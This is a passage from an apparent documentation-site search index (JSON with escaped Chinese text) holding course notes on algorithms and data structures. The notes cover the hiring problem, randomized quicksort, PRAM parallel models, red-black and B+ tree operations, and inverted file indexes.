Version","text":"<p>\u9762\u8bd5\u7684\u65f6\u5019\u9700\u8981\u7acb\u5373\u51b3\u5b9a\u662f\u5426\u96c7\u4f63\uff0c\u4e14\u53ea\u80fd\u96c7\u4f63\u4e00\u6b21\u3002</p> <p>\u5148\u9762\u8bd5 \\(K\\) \u4e2a\u4eba\uff0c\u627e\u5230\u6700\u597d\u7684\uff0c\u4f46\u662f\u4e0d\u8fdb\u884c\u96c7\u4f63\u3002\u7136\u540e\u9762\u8bd5\u540e\u9762\u7684\u4eba\uff0c\u5982\u679c\u6bd4\u4e4b\u524d\u7684\u4eba\u597d\uff0c\u5219\u96c7\u4f63\uff0c\u7ed3\u675f\u9762\u8bd5\u3002</p> <p>Decide \\(K\\)</p> <p>\\(S_i\\) \u8868\u793a\u7b2c \\(i\\) \u4e2a\u4eba\u662f\u6700\u597d\u7684\u3002\\(S_i\\) \u4e3a\u771f\uff0c\u5982\u679c\u4e8b\u4ef6 \\(A\\)\uff08\u7b2c \\(i\\) \u4e2a\u4eba\u662f\u6700\u597d\u7684\uff09\u53d1\u751f\uff0c\u4e14\u4e8b\u4ef6 \\(B\\)\uff08\u7b2c \\(K+1\\) \u5230\u7b2c \\(i-1\\) \u4e2a\u4eba\u90fd\u4e0d\u88ab\u96c7\u4f63\uff09\u53d1\u751f\u3002</p> \\[ \\mathrm{Pr}(S_i) = \\mathrm{Pr}(A \\cap B) = \\mathrm{Pr}(A) \\cdot \\mathrm{Pr}(B) = \\frac{1}{N} \\cdot \\frac{K}{i-1} = \\frac{K}{N(i-1)} \\] <p>\u5f97\u5230\u96c7\u4f63\u5230\u6700\u597d\u7684\u4eba\u7684\u6982\u7387\u4e3a</p> \\[ \\mathrm{Pr}(S) = \\sum_{i=K+1}^N \\mathrm{Pr}(S_i) = \\sum_{i=K+1}^N \\frac{K}{N(i-1)} = \\frac{K}{N} \\sum_{i=K}^{N-1} \\frac{1}{i} \\] <p>\u4ee4 \\(K = \\lceil N/e \\rceil\\)\uff0c\\(\\mathrm{Pr}(S) = 1/e\\)\u3002</p>"},{"location":"cs/ads/chapter13/#quicksort","title":"QuickSort","text":"<p>\u5982\u679c\u968f\u673a\u9009\u53d6\u7684 pivot \u5bfc\u81f4\u4e00\u4fa7\u5143\u7d20\u4e2a\u6570\u5c0f\u4e8e \\(n/4\\) \uff0c\u90a3\u4e48\u91cd\u65b0\u9009\u53d6 pivot\u3002\u9009\u51fa\u5408\u9002 pivot \u7684\u671f\u671b\u6b21\u6570\u662f\u4e24\u6b21\u3002</p> <p>\u5c06\u5b50\u95ee\u9898\u5206\u4e3a\u51e0\u7c7b\uff1a</p> <p>Type \\(j\\)\uff1a\u5b50\u95ee\u9898 \\(S\\) \u6ee1\u8db3 \\(N\\left(\\frac{3}{4}\\right)^{j+1} \\leq |S| &lt; N\\left(\\frac{3}{4}\\right)^{j}\\)</p> <p>\u6700\u591a\u6709 \\(\\left(\\frac{4}{3}\\right)^{j+1}\\) \u4e2a Type \\(j\\) \u7684\u5b50\u95ee\u9898\u3002</p> <p>\u65f6\u95f4\u5f00\u9500 \\(\\mathrm{E}(T_{\\text{Type }j}) = \\mathrm{O}(N \\cdot \\left(\\frac{4}{3}\\right)^{j+1}) \\times \\left(\\frac{3}{4}\\right)^{j+1} = \\mathrm{O}(N)\\)\u3002</p> <p>\u4e0d\u540c type \u4e2a\u6570 \\(\\log_{4/3} N = \\mathrm{O}(\\log N)\\)\u3002</p> <p>\u6240\u4ee5\u671f\u671b\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a \\(\\mathrm{O}(N \\log N)\\)\u3002</p>"},{"location":"cs/ads/chapter14/","title":"Parallel Algorithms","text":"<p>\u63cf\u8ff0\u5e76\u884c\u7b97\u6cd5\uff1a</p> <ul> <li>PRAM \u6a21\u578b\uff1aParallel Random Access Machine\uff0c\u5171\u4eab\u5185\u5b58\u6a21\u578b</li> <li>WD\uff1aWork Depth</li> </ul>"},{"location":"cs/ads/chapter14/#pram","title":"PRAM \u6a21\u578b","text":"<p>PRAM \u6a21\u578b\u662f\u4e00\u79cd\u5171\u4eab\u5185\u5b58\u6a21\u578b\uff0c\u6709\u4e09\u79cd\u7c7b\u578b\uff1a</p> <ul> <li>EREW\uff1aExclusive Read Exclusive Write \u6392\u4ed6\u8bfb\u6392\u4ed6\u5199</li> <li>CREW\uff1aConcurrent Read Exclusive Write \u5e76\u53d1\u8bfb\u6392\u4ed6\u5199</li> <li> <p>CRCW\uff1aConcurrent Read Concurrent Write \u5e76\u53d1\u8bfb\u5e76\u53d1\u5199</p> <p>\u5982\u679c\u53d1\u751f\u5199\u51b2\u7a81\uff0c\u6709\u4e24\u79cd\u7b56\u7565\uff1a</p> <ul> <li>Arbitrary rule\uff1a\u4efb\u610f\u89c4\u5219\uff0c\u968f\u673a\u9009\u62e9\u4e00\u4e2a\u5199\u5165</li> <li>Priority rule\uff1a\u4f18\u5148\u89c4\u5219\uff0c\u8bbe\u5b9a\u4f18\u5148\u7ea7\uff0c\u4f18\u5148\u7ea7\u9ad8\u7684\u5199\u5165</li> <li>Common rule\uff1a\u516c\u5171\u89c4\u5219\uff0c\u6240\u6709\u5199\u5165\u7684\u503c\u5fc5\u987b\u76f8\u540c</li> </ul> </li> </ul> <p><code>pardo</code> \u8868\u793a\u5faa\u73af\u5e76\u884c\u3002</p>"},{"location":"cs/ads/chapter14/#wd","title":"WD \u6a21\u578b","text":"<p>\u95f2\u7f6e\u5904\u7406\u5668\u4e0d\u7528\u8bbe\u7f6e\u4e3a idle\uff0c\u800c\u662f\u53ef\u4ee5\u8ba9\u5176\u6267\u884c\u5176\u4ed6\u4efb\u52a1\u3002</p>"},{"location":"cs/ads/chapter14/#measuring-the-performance","title":"Measuring the Performance","text":"<ul> <li>Work load\uff1a\u64cd\u4f5c\u7684\u603b\u6570 \\(W(N)\\)</li> <li>Worst case running time\uff1a\u6700\u574f\u60c5\u51b5\u8fd0\u884c\u65f6\u95f4 \\(T(N)\\)</li> </ul> <p>\u6e10\u8fdb\u7b49\u4ef7\uff1a</p> <ul> <li>\\(W(N)\\) \u6b21\u64cd\u4f5c\uff0c\u8fd0\u884c\u65f6\u95f4\u4e3a \\(T(N)\\)</li> <li>\u9700\u8981\u7684\u5904\u7406\u5668\u6570 \\(P(N) = W(N) / T(N)\\)\uff0c\u53ea\u80fd\u7528\u4e8e PRAM \u6a21\u578b</li> <li>\u8bbe\u5904\u7406\u5668\u6570\u4e3a \\(p \\leq P(N)\\)\uff0c\u5219\u8fd0\u884c\u65f6\u95f4\u4e3a \\(W(N) / p\\)</li> <li>\u5982\u679c\u5904\u7406\u5668\u6570 \\(p &gt; P(N)\\)\uff0c\u5219\u8fd0\u884c\u65f6\u95f4\u4e3a \\(W(N) / p + T(N)\\)</li> </ul>"},{"location":"cs/ads/chapter14/#prefix-sum","title":"Prefix Sum","text":"<p>\u524d\u7f00\u548c\u95ee\u9898\uff1a\u7ed9\u5b9a\u4e00\u4e2a\u6570\u7ec4\uff0c\u8ba1\u7b97\u524d\u7f00\u548c\u3002</p>"},{"location":"cs/ads/chapter14/#merging","title":"Merging","text":"<p>merge \u4e24\u4e2a\u6709\u5e8f\u6570\u7ec4\u3002</p> <p>\\(\\mathrm{RANK}(j, A)\\) \u4ee3\u8868\u6570\u7ec4 \\(A\\) \u4e2d\u5c0f\u4e8e\u7b49\u4e8e \\(B_j\\) \u7684\u5143\u7d20\u4e2a\u6570\uff0c\u5373\u4e3a \\(B_j\\) \u5e94\u8be5\u653e\u5728\u6570\u7ec4 \\(A\\) \u4e2d\u7684\u4f4d\u7f6e\u3002</p>"},{"location":"cs/ads/chapter14/#doubly-logarithmic-paradigm","title":"Doubly-Logarithmic Paradigm","text":""},{"location":"cs/ads/chapter15/","title":"External Sorting","text":""},{"location":"cs/ads/chapter2/","title":"Red-Black Trees and B+ Trees","text":""},{"location":"cs/ads/chapter2/#red-black-trees","title":"Red-Black Trees","text":"<p>\u4e8c\u53c9\u641c\u7d22\u6811\uff0c\u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6\uff1a</p> <ol> <li>\u6bcf\u4e2a\u8282\u70b9\u662f\u7ea2\u8272\u6216\u9ed1\u8272</li> <li>\u6839\u8282\u70b9\u662f\u9ed1\u8272</li> <li>\u6bcf\u4e2a\u53f6\u5b50\u8282\u70b9\uff08NIL\uff09\u662f\u9ed1\u8272</li> <li>\u5982\u679c\u4e00\u4e2a\u8282\u70b9\u662f\u7ea2\u8272\uff0c\u90a3\u4e48\u5b83\u7684\u4e24\u4e2a\u5b50\u8282\u70b9\u90fd\u662f\u9ed1\u8272</li> <li>\u5bf9\u4e8e\u6bcf\u4e2a\u8282\u70b9\uff0c\u4ece\u8be5\u8282\u70b9\u5230\u5176\u6240\u6709\u540e\u4ee3\u53f6\u5b50\u8282\u70b9\u7684\u7b80\u5355\u8def\u5f84\u4e0a\uff0c\u5747\u5305\u542b\u76f8\u540c\u6570\u76ee\u7684\u9ed1\u8272\u8282\u70b9</li> </ol> <p>Black Height</p> <p>\u4ece\u4e00\u4e2a\u8282\u70b9\u5230\u4e00\u4e2a\u53f6\u5b50\u8282\u70b9\u7684\u4efb\u4f55\u7b80\u5355\u8def\u5f84\u4e0a\u7684\u9ed1\u8272\u8282\u70b9\u6570\u76ee\u79f0\u4e3a\u8be5\u8282\u70b9\u7684\u9ed1\u9ad8\u5ea6\uff08black-height\uff09\uff0c\u8bb0\u4f5c \\(\\mathrm{bh}(x)\\)\u3002</p> <p>\u5f15\u7406</p> <p>\u4e00\u68f5\u6709 \\(n\\) \u4e2a\u5185\u90e8\u8282\u70b9\u7684\u7ea2\u9ed1\u6811\u7684\u9ad8\u5ea6\u81f3\u591a\u4e3a\\(2\\log(n+1)\\)\u3002</p>"},{"location":"cs/ads/chapter2/#operations","title":"Operations","text":""},{"location":"cs/ads/chapter2/#tree-rotation","title":"\u6811\u65cb\u8f6c\uff08Tree Rotation\uff09","text":"<p>\u548c AVL \u6811\u3001Splay \u6811\u4e00\u6837\u3002</p>"},{"location":"cs/ads/chapter2/#insertion","title":"Insertion","text":"<p>\u627e\u5230\u63d2\u5165\u4f4d\u7f6e\uff0c\u63d2\u5165\u65b0\u8282\u70b9\uff0c\u521d\u59cb\u989c\u8272\u4e3a\u7ea2\u8272\u3002</p> <p>\u53ef\u80fd\u7834\u574f\u7684\u6027\u8d28\u4e3a 2 \u548c 4\u3002</p> <p>\u5bf9\u4e8e\u6027\u8d28 2\uff0c\u4e3a\u63d2\u5165\u7b2c\u4e00\u4e2a\u8282\u70b9\u7684\u60c5\u51b5\uff0c\u76f4\u63a5\u5c06\u6839\u8282\u70b9\u6d82\u9ed1\u5373\u53ef\u3002</p> <p>\u5bf9\u4e8e\u6027\u8d28 4\uff0c\u5206\u4e3a\u4ee5\u4e0b\u60c5\u51b5\uff1a</p> <ol> <li> <p>\u51fa\u73b0\u4e24\u4e2a\u8fde\u7eed\u7684\u7ea2\u8272\u8282\u70b9\uff0c\u4e14\u4e0a\u5c42\u7684\u9ed1\u8272\u8282\u70b9\u7684\u5de6\u53f3\u513f\u5b50\u90fd\u662f\u7ea2\u8272\uff1a</p> <p></p> <p>\u8c03\u6574\u540e\u5411\u4e0a\u9012\u5f52\u68c0\u67e5\u3002</p> </li> <li> <p>\u51fa\u73b0\u4e24\u4e2a\u8fde\u7eed\u7684\u7ea2\u8272\u8282\u70b9\uff0c\u4e0a\u5c42\u7684\u9ed1\u8272\u8282\u70b9\u7684\u53e6\u5916\u4e00\u4e2a\u513f\u5b50\u662f\u9ed1\u8272\uff0c\u4e14\u4e24\u4e2a\u7ea2\u8272\u8282\u70b9\u4e0d\u5728\u4e00\u6761\u76f4\u7ebf\u4e0a\uff1a</p> <p></p> <p>\u8fdb\u884c\u4e00\u6b21\u65cb\u8f6c\uff0c\u4f7f\u5f97\u4e24\u4e2a\u7ea2\u8272\u8282\u70b9\u5728\u4e00\u6761\u76f4\u7ebf\u4e0a\u3002</p> </li> <li> <p>\u51fa\u73b0\u4e24\u4e2a\u8fde\u7eed\u7684\u7ea2\u8272\u8282\u70b9\uff0c\u4e0a\u5c42\u7684\u9ed1\u8272\u8282\u70b9\u7684\u53e6\u5916\u4e00\u4e2a\u513f\u5b50\u662f\u9ed1\u8272\uff0c\u4e14\u4e24\u4e2a\u7ea2\u8272\u8282\u70b9\u5728\u4e00\u6761\u76f4\u7ebf\u4e0a\uff1a</p> <p></p> <p>\u5c06\u4e0a\u5c42\u7ea2\u8272\u8282\u70b9\u67d3\u9ed1\uff0c\u4e0a\u5c42\u9ed1\u8272\u8282\u70b9\u67d3\u7ea2\uff0c\u6b64\u65f6\u5b50\u6811\u5de6\u8fb9\u7684\u9ed1\u9ad8\u5ea6\u6bd4\u53f3\u8fb9\u591a 1\uff0c\u8fdb\u884c\u4e00\u6b21\u65cb\u8f6c\u3002</p> </li> </ol> <p>\u6574\u4e2a\u63d2\u5165\u64cd\u4f5c\u6700\u591a\u8fdb\u884c\u4e24\u6b21\u65cb\u8f6c\uff1acase 2 -&gt; case 3\u3002</p>"},{"location":"cs/ads/chapter2/#deletion","title":"Deletion","text":"<p>\u5982\u679c\u5220\u9664\u7684\u8282\u70b9\u6709\u4e24\u4e2a\u513f\u5b50\uff0c\u5219\u5c06\u5176\u952e\u503c\u548c\u5176\u524d\u9a71\u6216\u540e\u7ee7\u8282\u70b9\u7684\u952e\u503c\u4e92\u6362\uff0c\u5220\u9664\u5176\u524d\u9a71\u6216\u540e\u7ee7\u8282\u70b9\u3002</p> <p>\u5982\u679c\u5220\u9664\u7684\u8282\u70b9\u53ea\u6709\u4e00\u4e2a\u513f\u5b50\uff0c\u7531\u4e8e\u6027\u8d28 5\uff0c\u5176\u513f\u5b50\u8282\u70b9\u5fc5\u4e3a\u53f6\u5b50\u8282\u70b9\uff0c\u8f6c\u6362\u4e3a\u5220\u9664\u53f6\u5b50\u8282\u70b9\u7684\u60c5\u51b5\u3002</p> <p>\u5982\u679c\u5220\u9664\u7684\u8282\u70b9\u662f\u7ea2\u8272\u8282\u70b9\uff0c\u76f4\u63a5\u5220\u9664\u3002</p> <p>\u5982\u679c\u5220\u9664\u7684\u8282\u70b9\u662f\u9ed1\u8272\u8282\u70b9\uff0c\u53ef\u80fd\u7834\u574f\u6027\u8d28 5\uff0c\u5206\u4e3a\u4ee5\u4e0b\u60c5\u51b5\uff1a</p> <ol> <li> <p>\u5982\u679c\u662f\u6839\u8282\u70b9\uff0c\u76f4\u63a5\u5220\u9664\u3002</p> </li> <li> <p>\u5982\u679c\u5176\u7236\u8282\u70b9\u4e3a\u9ed1\u8272\uff0c\u5144\u5f1f\u8282\u70b9\u4e3a\u7ea2\u8272\uff0c\u5219\u5c06\u5144\u5f1f\u8282\u70b9\u67d3\u9ed1\uff0c\u7236\u8282\u70b9\u67d3\u7ea2\uff0c\u8fdb\u884c\u4e00\u6b21\u65cb\u8f6c\uff1a</p> <p></p> <p>\u4f7f\u5f97\u5144\u5f1f\u8282\u70b9\u4e3a\u9ed1\u8272\u3002</p> </li> <li> <p>\u5982\u679c\u5176\u5144\u5f1f\u8282\u70b9\u4e3a\u9ed1\u8272\uff0c\u4e14\u5176\u5144\u5f1f\u8282\u70b9\u7684\u4e24\u4e2a\u513f\u5b50\u90fd\u4e3a\u9ed1\u8272\uff0c\u5219\u5c06\u5144\u5f1f\u8282\u70b9\u67d3\u7ea2\uff0c\u7236\u8282\u70b9\u4f5c\u4e3a\u65b0\u7684\u5f53\u524d\u8282\u70b9\uff1a</p> <p></p> <p>\u82e5\u7236\u8282\u70b9\u4e3a\u7ea2\u8272\uff0c\u5219\u5c06\u5176\u67d3\u9ed1\uff0c\u5426\u5219\u9012\u5f52\u68c0\u67e5\u3002</p> </li> <li> <p>\u5982\u679c\u5176\u5144\u5f1f\u8282\u70b9\u4e3a\u9ed1\u8272\uff0c\u4e14\u5176\u5144\u5f1f\u79bb\u5f53\u524d\u8282\u70b9\u8fdc\u7684\u513f\u5b50\u4e3a\u9ed1\u8272\uff0c\u8fd1\u7684\u513f\u5b50\u4e3a\u7ea2\u8272\uff0c\u5219\u5c06\u5144\u5f1f\u8282\u70b9\u67d3\u7ea2\uff0c\u8fd1\u7684\u513f\u5b50\u67d3\u9ed1\uff0c\u8fdb\u884c\u4e00\u6b21\u65cb\u8f6c\uff1a</p> <p></p> <p>\u4f7f\u5f97\u8fdc\u7684\u513f\u5b50\u4e3a\u7ea2\u8272\u3002</p> </li> <li> <p>\u5982\u679c\u5176\u5144\u5f1f\u8282\u70b9\u4e3a\u9ed1\u8272\uff0c\u4e14\u5176\u5144\u5f1f\u79bb\u5f53\u524d\u8282\u70b9\u8fdc\u7684\u513f\u5b50\u4e3a\u7ea2\u8272\uff0c\u5219\u5c06\u5144\u5f1f\u8282\u70b9\u548c\u7236\u8282\u70b9\u7684\u989c\u8272\u4e92\u6362\uff0c\u5144\u5f1f\u8282\u70b9\u7684\u8fdc\u7684\u513f\u5b50\u67d3\u9ed1\uff0c\u8fdb\u884c\u4e00\u6b21\u65cb\u8f6c\uff1a</p> <p></p> <p>\u4f7f\u5f97\u8fdc\u7684\u513f\u5b50\u4e3a\u9ed1\u8272\u3002\u6b64\u65f6\u5c06\u5f53\u524d\u8282\u70b9\u7684\u9ed1\u9ad8\u5ea6\u51cf 1\uff08\u5373\u5220\u9664\u6700\u5f00\u59cb\u7684\u9ed1\u8272\u8282\u70b9\uff09\uff0c\u6574\u68f5\u6811\u7684\u6027\u8d28 5 \u4ecd\u7136\u4fdd\u6301\u3002</p> </li> </ol> <p>\u6574\u4e2a\u5220\u9664\u64cd\u4f5c\u6700\u591a\u8fdb\u884c\u4e09\u6b21\u65cb\u8f6c\uff1acase 1 -&gt; case 2 -&gt; case 4 \u6216 case 3 -&gt; case 4\u3002</p> <p>Note</p> <p>\u4e0d\u4f1a\u51fa\u73b0 case 1 -&gt; case 2 -&gt; case 1 \u7684\u60c5\u51b5\uff0c\u56e0\u4e3a case 1 \u7ed3\u675f\u65f6\u7236\u8282\u70b9\u4e3a\u7ea2\u8272\uff0c\u4e0d\u4f1a\u8fdb\u5165\u5230 case 2 \u5411\u4e0a\u4f20\u9012\u7684\u60c5\u51b5\u3002</p>"},{"location":"cs/ads/chapter2/#complexity-analysis","title":"Complexity Analysis","text":"<p>\u6709 \\(n\\) \u4e2a\u8282\u70b9\u7684\u7ea2\u9ed1\u6811\u7684\u9ad8\u5ea6\u4e3a \\(O(2\\ln(n+1))\\)\u3002</p> <p>\u6839\u4e3a \\(x\\) \u7684\u5b50\u6811\u6ee1\u8db3 \\(\\mathrm{size}(x) \\geq 2^{\\mathrm{bh}(x)} - 1\\)\u3002</p>"},{"location":"cs/ads/chapter2/#b-trees","title":"B+ Trees","text":"<p>\u5ea6\uff08degree\uff09\u4e3a \\(m\\) \u7684 B+ \u6811\u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6\uff1a</p> <ol> <li>\u6839\u8282\u70b9\u8981\u4e48\u4e3a\u53f6\u5b50\u8282\u70b9\uff0c\u8981\u4e48\u513f\u5b50\u6570\u76ee\u5728 2 \u548c \\(m\\) \u4e4b\u95f4</li> <li>\u5176\u4ed6\u975e\u53f6\u5b50\u8282\u70b9\u7684\u513f\u5b50\u6570\u76ee\u5728 \\(\\lceil m/2 \\rceil\\) \u548c \\(m\\) \u4e4b\u95f4</li> <li>\u6bcf\u4e2a\u53f6\u5b50\u8282\u70b9\u5177\u6709\u76f8\u540c\u7684\u6df1\u5ea6</li> </ol> <p>\u5ea6\u4e3a 4 \u7684 B+ \u6811\uff082-3-4 \u6811\uff09\uff1a</p>"},{"location":"cs/ads/chapter2/#operations_1","title":"Operations","text":""},{"location":"cs/ads/chapter2/#split","title":"Split","text":"<p>\u5f53\u4e00\u4e2a\u8282\u70b9\u7684\u513f\u5b50\u6570\u76ee\u8d85\u8fc7 \\(m\\) \u65f6\uff0c\u5c06\u5176\u5206\u88c2\u4e3a\u4e24\u4e2a\u8282\u70b9\u63a5\u5728\u7236\u8282\u70b9\uff0c\u4e2d\u95f4\u7684\u952e\u4e0a\u5347\u5230\u7236\u8282\u70b9\uff0c\u518d\u9012\u5f52\u68c0\u67e5\u7236\u8282\u70b9\u3002</p> <p>\u5728\u6839\u8282\u70b9\u5206\u88c2\u65f6\uff0c\u65b0\u5efa\u4e00\u4e2a\u6839\u8282\u70b9\u3002</p>"},{"location":"cs/ads/chapter2/#merge","title":"Merge","text":"<p>\u5f53\u4e00\u4e2a\u8282\u70b9\u7684\u513f\u5b50\u6570\u76ee\u5c0f\u4e8e \\(\\lceil m/2 \\rceil\\) \u65f6\uff0c\u5206\u7c7b\u8ba8\u8bba\uff1a</p> <ul> <li>\u82e5\u5176\u67d0\u4e2a\u76f8\u90bb\u8282\u70b9\u7684\u513f\u5b50\u6570\u76ee\u5927\u4e8e \\(\\lceil m/2 \\rceil\\)\uff0c\u5219\u5c06\u5176\u76f8\u90bb\u8282\u70b9\u7684\u76f8\u90bb\u513f\u5b50\u79fb\u52a8\u5230\u8be5\u8282\u70b9</li> <li>\u82e5\u5176\u76f8\u90bb\u8282\u70b9\u7684\u513f\u5b50\u6570\u76ee\u90fd\u7b49\u4e8e \\(\\lceil m/2 \\rceil\\)\uff0c\u5219\u5c06\u5176\u4e0e\u76f8\u90bb\u8282\u70b9\u5408\u5e76</li> </ul> <p>\u5408\u5e76\u64cd\u4f5c\u5b8c\u6210\u540e\uff0c\u66f4\u65b0\u7236\u8282\u70b9\u7684\u4fe1\u606f\u3002</p> <p>\u5728\u6839\u8282\u70b9\u7684\u513f\u5b50\u6570\u76ee\u51cf\u5c11\u5230 1 \u65f6\uff0c\u5c06\u5176\u5220\u9664\u3002</p>"},{"location":"cs/ads/chapter2/#insertion_1","title":"Insertion","text":"<p>\u627e\u5230\u63d2\u5165\u4f4d\u7f6e\uff0c\u63d2\u5165\u65b0\u8282\u70b9\uff0c\u56de\u6eaf\u68c0\u67e5\u8fdb\u884c Split \u64cd\u4f5c\u3002</p>"},{"location":"cs/ads/chapter2/#deletion_1","title":"Deletion","text":"<p>\u627e\u5230\u5220\u9664\u4f4d\u7f6e\uff0c\u5220\u9664\u8282\u70b9\uff0c\u56de\u6eaf\u68c0\u67e5\u8fdb\u884c Merge \u64cd\u4f5c\u3002</p>"},{"location":"cs/ads/chapter2/#complexity-analysis_1","title":"Complexity Analysis","text":"<p>\u5ea6\u4e3a \\(m\\) \u4e14\u6709 \\(n\\) \u4e2a\u8282\u70b9\u7684 B+ \u6811\u7684\u9ad8\u5ea6\u4e3a \\(O(\\log_{\\lceil m/2 \\rceil} n)\\)\uff08\u6bcf\u4e2a\u8282\u70b9\u7684\u513f\u5b50\u6570\u76ee\u53d6 \\(\\lceil m/2 \\rceil\\) \u65f6\u9ad8\u5ea6\u6700\u5927\uff09\u3002</p> <p>\u63d2\u5165\u548c\u5220\u9664\u64cd\u4f5c\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a \\(O(\\log_{\\lceil m/2 \\rceil} n)\\)\u3002</p>"},{"location":"cs/ads/chapter3/","title":"Inverted File Index","text":""},{"location":"cs/ads/chapter3/#definition","title":"Definition","text":"<p>\u5012\u6392\u7d22\u5f15\u4e2d\uff0c\u5bf9\u4e8e\u6bcf\u4e2a\u5355\u8bcd\uff0c\u90fd\u8bb0\u5f55\u4e86\u5305\u542b\u8fd9\u4e2a\u5355\u8bcd\u7684\u6587\u6863\u6570\u548c\u6307\u5411\u8fd9\u4e9b\u6587\u6863\u7684\u6307\u9488\u3002</p> <p>\u5bf9\u4e8e\u6bcf\u4e2a\u5355\u8bcd\u51fa\u73b0\u7684\u6bcf\u4e2a\u6587\u6863\uff0c\u53ef\u4ee5\u8bb0\u5f55\u51fa\u73b0\u7684\u6b21\u6570\u548c\u4f4d\u7f6e\uff1a</p>"},{"location":"cs/ads/chapter3/#optimization","title":"Optimization","text":""},{"location":"cs/ads/chapter3/#word-stemming","title":"Word Stemming","text":"<p>\u8bcd\u5e72\u63d0\u53d6\uff0c\u5c06\u5355\u8bcd\u8f6c\u6362\u4e3a\u5176\u8bcd\u5e72\u5f62\u5f0f\uff0c\u5982\u5c06 \"running\" \u8f6c\u6362\u4e3a \"run\"\u3002</p>"},{"location":"cs/ads/chapter3/#stop-words","title":"Stop Words","text":"<p>\u505c\u7528\u8bcd\uff0c\u5982 \"a\", \"the\", \"is\" \u7b49\uff0c\u4e0d\u8bb0\u5f55\u8fd9\u4e9b\u5355\u8bcd\u3002</p>"},{"location":"cs/ads/chapter3/#access-documents","title":"Access Documents","text":"<p>\u5b58\u50a8\u5012\u6392\u7d22\u5f15\u7684\u6570\u636e\u7ed3\u6784\uff1a</p> <ol> <li>\u641c\u7d22\u6811\uff1aB+\u3001B-\u3001Trie \u7b49</li> <li>\u54c8\u5e0c\u8868</li> </ol>"},{"location":"cs/ads/chapter3/#distributed-index","title":"Distributed Index","text":"<ul> <li>Term Partitioning\uff1a\u5c06\u4e0d\u540c\u6bb5\u7684\u5012\u6392\u7d22\u5f15\u5206\u522b\u5b58\u50a8\u5728\u4e0d\u540c\u7684\u78c1\u76d8\u4e0a</li> <li>Document Partitioning\uff1a\u5c06\u4e0d\u540c\u6587\u6863\u7684\u5012\u6392\u7d22\u5f15\u5206\u522b\u5b58\u50a8\u5728\u4e0d\u540c\u7684\u78c1\u76d8\u4e0a</li> </ul>"},{"location":"cs/ads/chapter3/#not-enough-memory","title":"Not Enough Memory","text":"<p>\u5f53\u5185\u5b58\u4e0d\u8db3\u65f6\uff0c\u5c06\u5f53\u524d\u5185\u5b58\u4e2d\u7684\u5012\u6392\u7d22\u5f15\u5199\u5165\u78c1\u76d8\uff0c\u518d\u8bfb\u53d6\u4e0b\u4e00\u90e8\u5206\u3002</p> <p>\u5f53\u78c1\u76d8\u7a7a\u95f4\u4e0d\u8db3\u65f6\uff0c\u53ef\u4ee5\u5c06\u5012\u6392\u7d22\u5f15\u5206\u4e3a\u591a\u4e2a\u90e8\u5206\uff0c\u5206\u522b\u5b58\u50a8\u5728\u4e0d\u540c\u7684\u78c1\u76d8\u4e0a\u3002\u4e00\u822c\u91c7\u7528\u5206\u5e03\u5f0f\u5b58\u50a8\uff0c\u67e5\u8be2\u65f6\u8c03\u5ea6\u591a\u4e2a\u78c1\u76d8\u5e76\u884c\u8bfb\u53d6\u3002</p>"},{"location":"cs/ads/chapter3/#dynamic-index","title":"Dynamic Index","text":"<p>\u5efa\u7acb\u4e3b\u8868\u548c\u8f85\u52a9\u8868\uff0c\u8f85\u52a9\u8868\u52a8\u6001\u66f4\u65b0\uff0c\u5b58\u50a8\u65b0\u63d2\u5165\u7684\u6587\u6863\u3002\u67e5\u8be2\u65f6\u5728\u4e3b\u8868\u548c\u8f85\u52a9\u8868\u4e2d\u67e5\u627e\u3002</p> <p>\u5220\u9664\u65f6\uff0c\u5bf9\u5220\u9664\u7684\u6587\u6863\u8fdb\u884c\u6807\u8bb0\uff0c\u4e0d\u7528\u7acb\u5373\u4fee\u6539\u5012\u6392\u7d22\u5f15\u3002</p>"},{"location":"cs/ads/chapter3/#compression","title":"Compression","text":"<p>\u5bf9\u5012\u6392\u7d22\u5f15\u8fdb\u884c\u538b\u7f29\uff0c\u53ea\u5b58\u50a8 index \u7684\u5dee\u503c\u3002</p>"},{"location":"cs/ads/chapter3/#thresholding","title":"Thresholding","text":"<p>\u68c0\u7d22\u65f6\uff0c\u8ba1\u7b97\u6bcf\u4e2a\u6587\u6863\u7684\u6743\u91cd\uff0c\u53ea\u68c0\u7d22\u6743\u91cd\u5728\u524d \\(x\\) \u7684\u6587\u6863\u3002</p> <p>\u67e5\u8be2\u65f6\uff0c\u5c06\u67e5\u8be2\u8bcd\u51fa\u73b0\u7684\u6b21\u6570\u89c6\u4e3a\u6743\u91cd\uff0c\u6839\u636e\u6743\u91cd\u9ad8\u7684\u67e5\u8be2\u8bcd\u4f18\u5148\u68c0\u7d22\u3002</p>"},{"location":"cs/ads/chapter3/#measures-of-the-search-engine","title":"Measures of the Search Engine","text":"<p>\u5206\u4e3a\u4ee5\u4e0b\u6307\u6807\uff1a</p> <ul> <li>\u68c0\u7d22\u901f\u5ea6\uff08index\uff09\uff1a\u68c0\u7d22\u5230\u6587\u6863\u7684\u6570\u91cf/\u65f6\u95f4</li> <li>\u641c\u7d22\u901f\u5ea6\uff08search\uff09\uff1a\u4ee5\u68c0\u7d22\u5927\u5c0f\u4e3a\u81ea\u53d8\u91cf\u7684\u5ef6\u8fdf</li> <li> <p>Expressiveness of query language\uff1a\u67e5\u8be2\u8bed\u8a00\u7684\u8868\u8fbe\u80fd\u529b</p> <ul> <li>\u590d\u6742\u67e5\u8be2\u9700\u6c42</li> <li>\u590d\u6742\u67e5\u8be2\u7684\u901f\u5ea6</li> </ul> </li> </ul> <p>\u4e0d\u540c\u7684\u8bc4\u5224\u7c7b\u522b\uff1a</p> <ul> <li>Data retrieval \u6570\u636e\u68c0\u7d22\uff1a\u4e3b\u8981\u770b\u54cd\u5e94\u65f6\u95f4\u548c\u68c0\u7d22\u5927\u5c0f</li> <li>Information retrieval \u4fe1\u606f\u68c0\u7d22\uff1a\u4e3b\u8981\u770b\u68c0\u7d22\u7ed3\u679c\u7684\u51c6\u786e\u6027</li> </ul>"},{"location":"cs/ads/chapter3/#relevence-measurement","title":"Relevence Measurement","text":"<p>\u8ba1\u7b97\u67e5\u8be2\u8bcd\u4e0e\u6587\u6863\u7684\u76f8\u5173\u6027\uff0c</p> Relevent Irrelevent Retrieved RR IR Not Retrieved RI II <ul> <li> <p>\u51c6\u786e\u7387\uff08Precision\uff09\uff1a\\(P = \\frac{R_R}{R_R + 